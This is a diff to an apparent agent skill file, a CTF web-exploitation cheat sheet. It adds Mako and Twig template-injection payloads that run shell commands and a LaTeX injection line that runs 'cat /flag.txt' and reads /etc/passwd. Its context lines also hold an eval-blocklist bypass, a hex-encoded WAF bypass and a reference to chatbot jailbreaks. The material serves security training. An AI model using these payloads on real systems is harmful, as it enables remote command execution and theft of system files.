@@ -1,6 +1,6 @@
 ---
 name: ctf-web
-description: Provides web exploitation techniques for CTF challenges. Use when solving web security challenges involving XSS, SQLi, SSTI, SSRF, CSRF, XXE, file upload bypasses, JWT attacks, prototype pollution, path traversal, command injection, request smuggling, DOM clobbering, Web3/blockchain, authentication bypass, SAML exploitation, OAuth/OIDC, open redirect chains, subdomain takeover, or CI/CD credential theft.
+description: Provides web exploitation techniques for CTF challenges. Use when solving web security challenges involving XSS, SQLi, SSTI, SSRF, CSRF, XXE, file upload bypasses, JWT attacks, prototype pollution, path traversal, command injection, LaTeX injection, request smuggling, DOM clobbering, Web3/blockchain, authentication bypass, SAML exploitation, OAuth/OIDC, open redirect chains, subdomain takeover, or CI/CD credential theft.
 license: MIT
 compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
 allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
@@ -14,7 +14,7 @@ Quick reference for web CTF challenges. Each technique has a one-liner here; see
 
 ## Additional Resources
 
-- [server-side.md](server-side.md) - Core server-side injection attacks: SQLi, SSTI, SSRF (Host header, DNS rebinding), XXE, command injection, code injection (Ruby/Perl/Python), ReDoS, file upload→RCE, eval bypass, PHP type juggling, PHP file inclusion / php://filter, SSTI `__dict__.update()` quote bypass, ERB SSTI Sequel bypass, Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF bypass
+- [server-side.md](server-side.md) - Core server-side injection attacks: SQLi, SSTI, SSRF (Host header, DNS rebinding), XXE, command injection, LaTeX injection RCE, code injection (Ruby/Perl/Python), ReDoS, file upload→RCE, eval bypass, PHP type juggling, PHP file inclusion / php://filter, SSTI `__dict__.update()` quote bypass, ERB SSTI Sequel bypass, Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF bypass
 - [server-side-advanced.md](server-side-advanced.md) - Advanced server-side techniques: ExifTool CVE-2021-22204, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses (brace stripping, double URL encoding, os.path.join, %2f), Flask/Werkzeug debug mode, XXE external DTD filter bypass, WeasyPrint SSRF, MongoDB regex injection, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE (CVE-2025-55182), SSRF→Docker API RCE chain, Castor XML xsi:type deserialization (Atlas HTB), Apache ErrorDocument expression file read (Zero HTB)
 - [client-side.md](client-side.md) - Client-side attacks: XSS, CSRF, CSPT, cache poisoning, DOM tricks, React input filling, hidden elements, XS-Leak timing oracle, GraphQL CSRF, Unicode case folding XSS bypass (long-s U+017F), CSS font glyph container query exfiltration, Hyperscript CDN CSP bypass, PBKDF2 prefix timing oracle
 - [auth-and-access.md](auth-and-access.md) - Auth/authz attacks: password inference, weak validation, client-side gates, NoSQL auth bypass, HAProxy/Express.js bypass, IDOR on WIP endpoints, HTTP TRACE method bypass, LLM/AI chatbot jailbreak, open redirect chains (OAuth token theft), subdomain takeover
@@ -107,6 +107,8 @@ See [auth-jwt.md](auth-jwt.md) for full JWT/JWE attacks and session manipulation
 {{obj.__dict__.update(attr=value) or obj.name}}
 ```
 
+**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Twig repeats string, Jinja2 returns 49). See [server-side.md](server-side.md#mako-ssti) and [server-side.md](server-side.md#twig-ssti).
+
 **Quote filter bypass:** Use `__dict__.update(key=value)` — keyword arguments need no quotes. See [server-side.md](server-side.md#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026).
 
 **ERB SSTI (Ruby/Sinatra):** `<%= Sequel::DATABASES.first[:table].all %>` bypasses ERBSandbox variable-name restrictions via the global `Sequel::DATABASES` array. See [server-side.md](server-side.md#erb-ssti--sequeldatabases-bypass-bearcatctf-2026).
@@ -161,6 +163,7 @@ See [server-side.md](server-side.md#php-file-inclusion--phpfilter) for filter ch
 **Perl `open()`:** 2-arg open allows pipe: `|command|`
 **JS `eval` blocklist bypass:** `row['con'+'structor']['con'+'structor']('return this')()`
 **PHP deserialization:** Craft serialized object in cookie → LFI/RCE
+**LaTeX injection:** `\input{|"cat /flag.txt"}` — shell command via pipe syntax in PDF generation services. `\@@input"/etc/passwd"` for file reads without shell.
 
 See [server-side.md](server-side.md) for full payloads and bypass techniques.
 
@@ -330,7 +333,7 @@ HTML injection → meta refresh redirect (CSP bypass) → admin bot loads attack
 
 ## React Server Components Flight Protocol RCE (Ehax 2026)
 
-Identify via `Next-Action` + `Accept: text/x-component` headers. CVE-2025-55182: fake Flight chunk exploits constructor chain for server-side JS execution. Exfiltrate via `NEXT_REDIRECT` error → `x-action-redirect` header. WAF bypass: `'chi'+'ld_pro'+'cess'` or hex `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`. See [server-side-advanced.md](server-side-advanced.md#react-server-components-flight-protocol-rce-ehax-2026) and [cves.md](cves.md#cve-2025-55182-react-server-components-flight-protocol-rce).
+Identify via `Next-Action` + `Accept: text/x-component` headers. CVE-2025-55182: fake Flight chunk exploits constructor chain for server-side JS execution. Exfiltrate via `NEXT_REDIRECT` error → `x-action-redirect` header. WAF bypass: `'chi'+'ld_pro'+'cess'` or hex `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`. See [server-side-advanced.md](server-side-advanced.md#react-server-components-flight-protocol-rce-ehax-2026) and [cves.md](cves.md#cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce).
 
 ## Unicode Case Folding XSS Bypass (UNbreakable 2026)
 
